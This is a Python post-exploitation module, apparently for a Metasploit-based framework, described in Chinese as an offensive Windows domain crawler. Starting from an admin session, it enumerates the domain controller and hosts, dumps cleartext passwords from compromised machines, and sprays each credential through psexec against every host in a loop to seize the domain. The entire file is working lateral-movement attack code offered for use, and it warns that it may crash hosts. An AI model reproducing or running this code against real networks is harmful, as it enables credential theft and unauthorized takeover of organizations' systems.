# -*- coding: utf-8 -*-

import time

from PostModule.lib.Configs import *
from PostModule.lib.Domain import Domain
from PostModule.lib.ModuleTemplate import TAG2CH, PostPythonModule
from PostModule.lib.MsfModule import MsfModuleAsFunction
from PostModule.lib.OptionAndResult import Option, register_options
from PostModule.lib.Session import Session, SessionList


class PostModule(PostPythonModule):
    NAME = "Windows域攻击性爬虫"
    DESC = "模块内部通过提权,嗅探,扫描等操作,通过域内主机的单一权限尝试获取域控服务器控制权(请注意,模块具有高危险性,可能导致域内主机崩溃)"
    REQUIRE_SESSION = True
    MODULETYPE = TAG2CH.Lateral_Movement
    OPTIONS = register_options([
        Option(name=HANDLER_OPTION.get('name'), name_tag=HANDLER_OPTION.get('name_tag'),
               type=HANDLER_OPTION.get('type'), required=True,
               desc=HANDLER_OPTION.get('desc'),
               enum_list=[], option_length=HANDLER_OPTION.get('option_length')),

    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.domain_controller = None
        self.domain_hosts = []
        self.domain_hosts_has_session = []  # 已获取管理员Session权限的主机列表
        self.domain_hosts_has_mimi = []  # 已抓取过密码的主机列表
        self.credentials_used = []
        self.credentials_unuse = []

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "模块只支持Meterpreter类型的Session"
        if not session.is_in_domain:
            return False, "模块初始Sesion必须在域中"
        if not session.is_admin:
            return False, "模块初始Sesion必须拥有本地管理员权限"
        return True, None

    def get_domain_infos(self, sessionid):
        session_domain = Domain(sessionid)
        self.domain_controller = session_domain.get_domain_controller()
        self.domain_hosts = session_domain.get_domain_computers()

    @staticmethod
    def _get_sessionid(host):
        sessions = SessionList.list_sessions()
        for session in sessions:
            if session.get('session_host') in host.get('ipaddress'):
                return session.get('id')
        return None

    def gen_new_session(self):
        """尝试获取新的sesison"""
        tmp_cred_list = []
        for credential in self.credentials_unuse:  # 循环使用每个凭证
            tmp_cred_list.append(credential)
            for host in self.domain_hosts:
                if host not in self.domain_hosts_has_session:  # 判断主机是否已经拥有权限
                    handler = self.param(HANDLER_OPTION.get('name'))
                    for ipaddress in host.get('ipaddress'):
                        jobdict = MsfModuleAsFunction.psexec_exploit(rhosts=ipaddress,
                                                                     smbdomain=self.domain_controller.get('Domain'),
                                                                     smbuser=credential.get('user'),
                                                                     smbpass=credential.get('password'),
                                                                     handler=handler)

                        self.log_status("尝试获取权限,IP地址:{} 任务ID:{}".format(ipaddress, jobdict.get('job_id')))
                        time.sleep(5)
        # 清理已用的cred
        for one in tmp_cred_list:
            self.credentials_unuse.remove(one)
            self.credentials_used.append(one)

    def update_credentials_unuse(self):
        """更新未使用凭证"""
        for host in self.domain_hosts_has_session:
            if host not in self.domain_hosts_has_mimi:
                sessionid = self._get_sessionid(host)
                credentials = MsfModuleAsFunction.get_windows_password(sessionid)
                if host not in self.domain_hosts_has_mimi:
                    self.domain_hosts_has_mimi.append(host)
                else:
                    print('error')

                for credential in credentials:
                    if credential.get('domain').lower() in self.domain_controller.get('Domain'):
                        user_password = {'user': credential.get('user'), 'password': credential.get('password')}
                        if user_password not in self.credentials_used and user_password not in self.credentials_unuse:  # 未存储和使用过此密码
                            self.credentials_unuse.append(user_password)
                            self.log_good("发现可用凭证,用户名:{} 密码:{}".format(user_password.get('user'),
                                                                       user_password.get('password')))
                            time.sleep(5)

    def update_domain_hosts_has_session(self):
        """更新已获取权限列表"""
        sessions = SessionList.list_sessions()
        for domain_host in self.domain_hosts:
            for one_session in sessions:
                # 如果session_host存在于主机的列表中,再进行进一步权限检查
                if one_session.get('session_host') in domain_host.get('ipaddress'):
                    session_intent = Session(one_session.get('id'))
                    if session_intent.is_admin:  # 检查是否获取了admin权限
                        # 去重添加
                        if domain_host not in self.domain_hosts_has_session:
                            self.domain_hosts_has_session.append(domain_host)
                            self.log_good("发现新可用Session,SID:{} IP:{} 主机名:{}".format(session_intent.sessionid,
                                                                                          session_intent.session_host,
                                                                                          session_intent.computer))

    def run(self):
        self.clean_log()  # 清理历史结果
        self.log_raw("--------------------初始信息收集-------------------------\n")
        self.log_status("开始侦查域信息")
        self.get_domain_infos(self._sessionid)
        if self.domain_hosts == [] or self.domain_controller is None:
            self.log_error("侦查域信息失败,请确认初始Session拥有足够的域权限")
            return
        else:
            self.log_good("侦查域信息成功,域名称: {}".format(self.domain_controller.get('Domain')))
            self.log_good("侦查域信息成功,域控主机: {}".format(self.domain_controller.get('Name')))
            self.log_good("侦查域信息成功,域控主机版本: {}".format(self.domain_controller.get('OSVersion')))
            self.log_good("侦查域信息成功,域内主机数量: {}".format(len(self.domain_hosts)))

        self.log_raw("--------------------域内循环渗透-------------------------\n")
        self.update_domain_hosts_has_session()
        time.sleep(10)  # 等待30秒,session返回
        self.update_credentials_unuse()

        if self.credentials_unuse == [] or self.domain_hosts_has_session == []:
            self.log_error("抓取初始凭证失败,请确认初始Session拥有足够的权限")
            return
        else:
            self.log_good("抓取初始凭证成功,可用凭证数量: {}".format(len(self.credentials_unuse)))

        while True:
            self.gen_new_session()
            self.log_raw("--------------------等待Session返回-------------------------\n")
            time.sleep(30)  # 等待30秒,session返回
            self.update_domain_hosts_has_session()
            time.sleep(10)  # 等待30秒,session返回
            self.update_credentials_unuse()
            if len(self.credentials_unuse) == 0:
                self.log_raw("--------------------循环渗透结束-------------------------\n")
                return
